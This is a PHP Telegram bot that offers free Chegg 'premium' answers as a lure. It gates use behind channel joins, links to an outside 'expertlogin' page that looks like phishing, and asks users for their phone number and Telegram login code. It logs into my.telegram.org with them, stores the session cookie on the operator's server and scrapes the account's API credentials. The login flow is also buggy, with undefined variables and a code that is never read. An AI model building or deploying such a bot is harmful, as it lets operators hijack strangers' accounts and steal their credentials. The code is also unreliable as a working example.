<?php
$admin = 2110818173;
$API_KEY = "Your_token";
ob_start();
define('API_KEY', $API_KEY);
echo file_get_contents("https://api.telegram.org/bot$API_KEY/setwebhook?url=" . $_SERVER['SERVER_NAME'] . "" . $_SERVER['SCRIPT_NAME'] . "");

function bot($method, $datas = [])
{
    $url = "https://api.telegram.org/bot" . API_KEY . "/" . $method;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $datas);
    $res = curl_exec($ch);
    if (curl_error($ch)) {
        var_dump(curl_error($ch));
    } else {
        return json_decode($res);
    }
}

$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$newchat_id = $message->new_chat_member->id;
$leftchat_id = $message->left_chat_member->id;
$text = $message->text;
$chat_id = $message->chat->id;
$from_id = $message->from->id;
$user = '@' . $message->from->username;
$name = $message->from->first_name; // Corrected variable name
$username = $message->from->username;
$data = $update->callback_query->data;
$chat_id2 = $update->callback_query->message->chat->id;
$message_id = $update->callback_query->message->message_id;
$ex = explode(' ', $text);
//*****Joined Channel request*****//
$join = bot('getChatMember', ["chat_id" => "@cheggnx", "user_id" => $from_id])->result->status;
$join2 = bot('getChatMember', ["chat_id" => "@CheggbyTnTbot", "user_id" => $from_id])->result->status;
if (($newchat_id != '' or $leftchat_id != '') || ($message && ($join == 'left' or $join == 'kicked' or $join2 == 'left' or $join2 == 'kicked'))) {
    // Delete the message
    bot('deleteMessage', [
        'chat_id' => $chat_id,
        'message_id' => $message->message_id
    ]);

    // Send a welcome message with channel subscription links
    bot('sendMessage', [
        'chat_id' => $from_id,
        'text' => "Welcome $name 🔓 🔰 | You must subscribe to the channels to use the bot for free.",
        'reply_to_message_id' => $message->chat_id,
        'reply_markup' => json_encode([
            'inline_keyboard' => [
                [['text' => '• Join Channel 1 - ', 'url' => 'https://t.me/cheggnx']],
                [['text' => '• Join Channel 2 - ', 'url' => 'https://t.me/CheggbyTnTbot']]
            ]
        ])
    ]);

    // Terminate the script
    die('A_god');
}
//*****Start Command*****//
if ($text == '/start') {
    bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "🔓 Unlock Premium Features Now! 🔓

Hey there!

Ready to take your learning to the next level? Unlock premium features on Chegg and gain access to expert CF score questions and completed solutions, along with other exclusive offers!

Simply click on the link below to get started:
https://nx.aba.vg/expertlogin/ReportExpert/RE/index.html

Don't miss out on this limited opportunity to supercharge your study sessions. Join the elite league of learners today!

Happy studying! 📚✨",
        'reply_to_message_id' => $message->message_id,
        'disable_web_page_preview' => true,
        'reply_markup' => json_encode([
            'inline_keyboard' => [
                [
                    ["text" => "Developer 💚", "url" => 'https://t.me/spacenx1']
                ],
                [
                    ["text" => "How to Use 📘", "url" => 'https://t.me/cheggnx/58']
                ],
                [
                    ["text" => "Support 🛠️", "url" => 'https://t.me/spacenx1']
                ]
            ]
        ])
    ]);
}




//get Web Login
function getWeblogin($phone_number){
    $curl = curl_init();

    curl_setopt_array($curl, array(
      CURLOPT_URL => 'https://my.telegram.org/auth/send_password',
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_ENCODING => '',
      CURLOPT_MAXREDIRS => 10,
      CURLOPT_TIMEOUT => 0,
      CURLOPT_FOLLOWLOCATION => true,
      CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
      CURLOPT_CUSTOMREQUEST => 'POST',
      CURLOPT_POSTFIELDS => 'phone='.urlencode($phone_number),
      CURLOPT_HTTPHEADER => array(
        'accept: application/json, text/javascript, */*; q=0.01',
        'accept-language: en-US,en;q=0.9,ru;q=0.8,zh-TW;q=0.7,zh;q=0.6',
        'content-type: application/x-www-form-urlencoded; charset=UTF-8',
        'dnt: 1',
        'origin: https://my.telegram.org',
        'referer: https://my.telegram.org/auth',
        'sec-ch-ua: "Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Linux"',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-origin',
        'user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
        'x-requested-with: XMLHttpRequest'
      ),
    ));
    
    $response = curl_exec($curl);
    
    curl_close($curl);
    //echo $response;
    $data = json_decode($response,true);
    if ($response === false) {
        echo 'cURL error: ' . curl_error($curl);
    } else {
        $data = json_decode($response,true);
        $random_hash = $data['random_hash'];
        if(isset($random_hash)){
            return [$random_hash,$phone_number];
        }
        else{
            return [null,null];
        }
    }  
}

//login

function authlogin($passwd){
    $login = getWeblogin($phone_number);
    $cookieFile = "cookies_" . $login[1] . ".txt";
    $folder = "store";
    $folderPath = __DIR__ . '/' . $folder;
    if (!file_exists($folderPath)) {
        mkdir($folderPath, 0777, true); // Creates the folder recursively
    }
    $filePath = $folderPath . '/' . $cookieFile;
    $curl = curl_init();

    curl_setopt_array($curl, array(
        CURLOPT_URL => 'https://my.telegram.org/auth/login',
        CURLOPT_COOKIEJAR => $filePath,
        CURLOPT_COOKIEFILE => $filePath,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => '',
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => 0,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => 'POST',
        CURLOPT_POSTFIELDS => 'phone=' . urlencode($login[1]) . '&random_hash=' . urlencode($login[0]) . '&password=' . urlencode($passwd),
        CURLOPT_HTTPHEADER => array(
            'accept: application/json, text/javascript, */*; q=0.01',
            'accept-language: en-US,en;q=0.9,ru;q=0.8,zh-TW;q=0.7,zh;q=0.6',
            'content-type: application/x-www-form-urlencoded; charset=UTF-8',
            'dnt: 1',
            'origin: https://my.telegram.org',
            'referer: https://my.telegram.org/auth',
            'sec-ch-ua: "Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Linux"',
            'sec-fetch-dest: empty',
            'sec-fetch-mode: cors',
            'sec-fetch-site: same-origin',
            'user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
            'x-requested-with: XMLHttpRequest'
        ),
    ));

    $response = curl_exec($curl);

    curl_close($curl);
    //echo $response;
    if ($response === false) {
        echo 'cURL error: ' . curl_error($curl);
    } else {
        $cookieContent = file_get_contents($filePath);

        if ($cookieContent !== false) { 
            $cookies = [];
            $cookieLines = explode("\n", $cookieContent);
            foreach ($cookieLines as $cookieLine) {
                $parts = explode("\t", $cookieLine);
                if (count($parts) >= 7) {
                    $name = $parts[5];
                    $value = $parts[6];
                    $cookies[$name] = $value;
                }
            }
            if (isset($cookies['stel_token'])) {
                $stel_token = $cookies['stel_token'];
                return $stel_token;
                // echo 'Access Token: ' . $stel_token;
            } else {
                return 'Access Token not found.';
            }
        } else {
            return 'Failed to read cookie file.';
        }
    }
}
function getapihash($stel_token){
    $curl = curl_init();

    curl_setopt_array($curl, array(
        CURLOPT_URL => 'https://my.telegram.org/apps',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => '',
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => 0,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => 'GET',
        CURLOPT_HTTPHEADER => array(
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language: en-US,en;q=0.9,ru;q=0.8,zh-TW;q=0.7,zh;q=0.6',
            'cookie: stel_token='.$stel_token,
            'dnt: 1',
            'referer: https://my.telegram.org/',
            'sec-ch-ua: "Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Linux"',
            'sec-fetch-dest: document',
            'sec-fetch-mode: navigate',
            'sec-fetch-site: same-origin',
            'sec-fetch-user: ?1',
            'user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36'
        ),
    ));

    $response = curl_exec($curl);

    curl_close($curl);
    //echo $response;
    if ($response === false) {
        echo 'cURL error: ' . curl_error($curl);
    } else {
        return $response;
    }
}


if ($text == '/start') {
    bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "📱 Please enter your phone number (e.g., +1234567890):",
        'reply_markup' => json_encode([
            'force_reply' => true 
        ])
    ]);
} elseif (isset($text)) {
    $phone_number = $text;
    $loginid = getWeblogin($phone_number);
    bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "Thank you for providing your phone number! 📱✅"
    ]);
    if(isset($loginid[0])){
        $response = bot('sendMessage', [
            'chat_id' => $chat_id,
            'text' => "📱 Please enter your code you have received",
            'reply_markup' => json_encode([
                'force_reply' => true 
            ])
        ]);
        if($response['ok']){
            sleep(10);
            $stel_token = authlogin($passwd);
            if(isset($stel_token)){
                $reponseData = getapihash($stel_token);
                $html = <<<HTML
                $reponseData
                HTML;
                $patterns = [
                    '/<label for="app_id" class="col-md-4 text-right control-label">App api_id:<\/label>\s*<div class="col-md-7">\s*<span class="form-control input-xlarge uneditable-input" onclick="this.select\(\);"><strong>(.*?)<\/strong><\/span>/s',
                    '/<label for="app_hash" class="col-md-4 text-right control-label">App api_hash:<\/label>\s*<div class="col-md-7">\s*<span class="form-control input-xlarge uneditable-input" onclick="this.select\(\);">(.*?)<\/span>/s',
                    '/<label class="col-md-4 text-right control-label">Test configuration:<\/label>\s*<div class="col-md-8">\s*<span class="form-control input-xlarge uneditable-input"><strong>(.*?)<\/strong><\/span>/s',
                    '/<label class="col-md-4 text-right control-label">Production configuration:<\/label>\s*<div class="col-md-8">\s*<span class="form-control input-xlarge uneditable-input"><strong>(.*?)<\/strong><\/span>/s',
                    '/<code>(.*?)<\/code>/s' // Assuming the public key is in a <code> tag
                ];
                
                // Initialize an array to store extracted data
                $extracted_data = [];
                
                // Loop through patterns and extract data
                foreach ($patterns as $pattern) {
                    preg_match($pattern, $html, $matches);
                    if (!empty($matches)) {
                        $extracted_data[] = $matches[1];
                    } else {
                        $extracted_data[] = "Not found";
                    }
                }
                bot('sendMessage', [
                    'chat_id' => $chat_id,
                    'text' => "App api_id: {$extracted_data[0]} 📱\n" .
                              "App api_hash: {$extracted_data[1]} 🔒\n" .
                              "Test configuration: {$extracted_data[2]} 🧪\n" .
                              "Production configuration: {$extracted_data[3]} 🚀\n" .
                              "Public Key: {$extracted_data[4]} 🔑\n" 
                ]);
                

            }else{
                bot('sendMessage', [
                    'chat_id' => $chat_id,
                    'text' => "token not found"
                ]);
            }
        }else{
            bot('sendMessage', [
                'chat_id' => $chat_id,
                'text' => "password not  enter"
            ]);
        }
    }else{
        bot('sendMessage', [
            'chat_id' => $chat_id,
            'text' => "response hash not found"
        ]);
    }
}
?>
